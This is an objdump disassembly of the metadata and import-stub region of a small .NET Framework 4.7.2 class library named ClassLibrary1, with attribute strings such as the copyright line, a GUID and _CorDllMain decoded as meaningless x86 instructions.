1000374e:	00 01                	add    %al,(%ecx)
10003750:	01 12                	add    %edx,(%edx)
10003752:	49                   	dec    %ecx
10003753:	04 20                	add    $0x20,%al
10003755:	01 01                	add    %eax,(%ecx)
10003757:	08 08                	or     %cl,(%eax)
10003759:	01 00                	add    %eax,(%eax)
1000375b:	08 00                	or     %al,(%eax)
1000375d:	00 00                	add    %al,(%eax)
1000375f:	00 00                	add    %al,(%eax)
10003761:	1e                   	push   %ds
10003762:	01 00                	add    %eax,(%eax)
10003764:	01 00                	add    %eax,(%eax)
10003766:	54                   	push   %esp
10003767:	02 16                	add    (%esi),%dl
10003769:	57                   	push   %edi
1000376a:	72 61                	jb     0x100037cd
1000376c:	70 4e                	jo     0x100037bc
1000376e:	6f                   	outsl  %ds:(%esi),(%dx)
1000376f:	6e                   	outsb  %ds:(%esi),(%dx)
10003770:	45                   	inc    %ebp
10003771:	78 63                	js     0x100037d6
10003773:	65 70 74             	gs jo  0x100037ea
10003776:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
1000377d:	77 73                	ja     0x100037f2
1000377f:	01 06                	add    %eax,(%esi)
10003781:	20 01                	and    %al,(%ecx)
10003783:	01 11                	add    %edx,(%ecx)
10003785:	80 85 08 01 00 07 01 	addb   $0x1,0x7000108(%ebp)
1000378c:	00 00                	add    %al,(%eax)
1000378e:	00 00                	add    %al,(%eax)
10003790:	12 01                	adc    (%ecx),%al
10003792:	00 0d 43 6c 61 73    	add    %cl,0x73616c43
10003798:	73 4c                	jae    0x100037e6
1000379a:	69 62 72 61 72 79 31 	imul   $0x31797261,0x72(%edx),%esp
100037a1:	00 00                	add    %al,(%eax)
100037a3:	05 01 00 00 00       	add    $0x1,%eax
100037a8:	00 17                	add    %dl,(%edi)
100037aa:	01 00                	add    %eax,(%eax)
100037ac:	12 43 6f             	adc    0x6f(%ebx),%al
100037af:	70 79                	jo     0x1000382a
100037b1:	72 69                	jb     0x1000381c
100037b3:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
100037b9:	20 20                	and    %ah,(%eax)
100037bb:	32 30                	xor    (%eax),%dh
100037bd:	32 34 00             	xor    (%eax,%eax,1),%dh
100037c0:	00 04 20             	add    %al,(%eax,%eiz,1)
100037c3:	01 01                	add    %eax,(%ecx)
100037c5:	02 29                	add    (%ecx),%ch
100037c7:	01 00                	add    %eax,(%eax)
100037c9:	24 30                	and    $0x30,%al
100037cb:	33 64 35 37          	xor    0x37(%ebp,%esi,1),%esp
100037cf:	35 39 64 2d 37       	xor    $0x372d6439,%eax
100037d4:	30 37                	xor    %dh,(%edi)
100037d6:	38 2d 34 36 32 37    	cmp    %ch,0x37323634
100037dc:	2d 61 31 66 32       	sub    $0x32663161,%eax
100037e1:	2d 36 31 34 66       	sub    $0x66343136,%eax
100037e6:	65 66 65 37          	gs data16 gs aaa
100037ea:	39 31                	cmp    %esi,(%ecx)
100037ec:	33 31                	xor    (%ecx),%esi
100037ee:	00 00                	add    %al,(%eax)
100037f0:	0c 01                	or     $0x1,%al
100037f2:	00 07                	add    %al,(%edi)
100037f4:	31 2e                	xor    %ebp,(%esi)
100037f6:	30 2e                	xor    %ch,(%esi)
100037f8:	30 2e                	xor    %ch,(%esi)
100037fa:	30 00                	xor    %al,(%eax)
100037fc:	00 4d 01             	add    %cl,0x1(%ebp)
100037ff:	00 1c 2e             	add    %bl,(%esi,%ebp,1)
10003802:	4e                   	dec    %esi
10003803:	45                   	inc    %ebp
10003804:	54                   	push   %esp
10003805:	46                   	inc    %esi
10003806:	72 61                	jb     0x10003869
10003808:	6d                   	insl   (%dx),%es:(%edi)
10003809:	65 77 6f             	gs ja  0x1000387b
1000380c:	72 6b                	jb     0x10003879
1000380e:	2c 56                	sub    $0x56,%al
10003810:	65 72 73             	gs jb  0x10003886
10003813:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
1000381a:	37                   	aaa
1000381b:	2e 32 01             	xor    %cs:(%ecx),%al
1000381e:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
10003822:	46                   	inc    %esi
10003823:	72 61                	jb     0x10003886
10003825:	6d                   	insl   (%dx),%es:(%edi)
10003826:	65 77 6f             	gs ja  0x10003898
10003829:	72 6b                	jb     0x10003896
1000382b:	44                   	inc    %esp
1000382c:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
10003833:	61                   	popa
10003834:	6d                   	insl   (%dx),%es:(%edi)
10003835:	65 14 2e             	gs adc $0x2e,%al
10003838:	4e                   	dec    %esi
10003839:	45                   	inc    %ebp
1000383a:	54                   	push   %esp
1000383b:	20 46 72             	and    %al,0x72(%esi)
1000383e:	61                   	popa
1000383f:	6d                   	insl   (%dx),%es:(%edi)
10003840:	65 77 6f             	gs ja  0x100038b2
10003843:	72 6b                	jb     0x100038b0
10003845:	20 34 2e             	and    %dh,(%esi,%ebp,1)
10003848:	37                   	aaa
10003849:	2e 32 00             	xor    %cs:(%eax),%al
1000384c:	74 38                	je     0x10003886
	...
10003856:	00 00                	add    %al,(%eax)
10003858:	8e 38                	mov    (%eax),%?
1000385a:	00 00                	add    %al,(%eax)
1000385c:	00 20                	add    %ah,(%eax)
	...
10003872:	00 00                	add    %al,(%eax)
10003874:	80 38 00             	cmpb   $0x0,(%eax)
	...
1000387f:	00 00                	add    %al,(%eax)
10003881:	00 5f 43             	add    %bl,0x43(%edi)
10003884:	6f                   	outsl  %ds:(%esi),(%dx)
10003885:	72 44                	jb     0x100038cb
10003887:	6c                   	insb   (%dx),%es:(%edi)
10003888:	6c                   	insb   (%dx),%es:(%edi)
10003889:	4d                   	dec    %ebp
1000388a:	61                   	popa
1000388b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
10003892:	72 65                	jb     0x100038f9
10003894:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
10003898:	6c                   	insb   (%dx),%es:(%edi)
10003899:	00 00                	add    %al,(%eax)
1000389b:	00 00                	add    %al,(%eax)
1000389d:	00 ff                	add    %bh,%bh
1000389f:	25 00 20 00 10       	and    $0x10002000,%eax
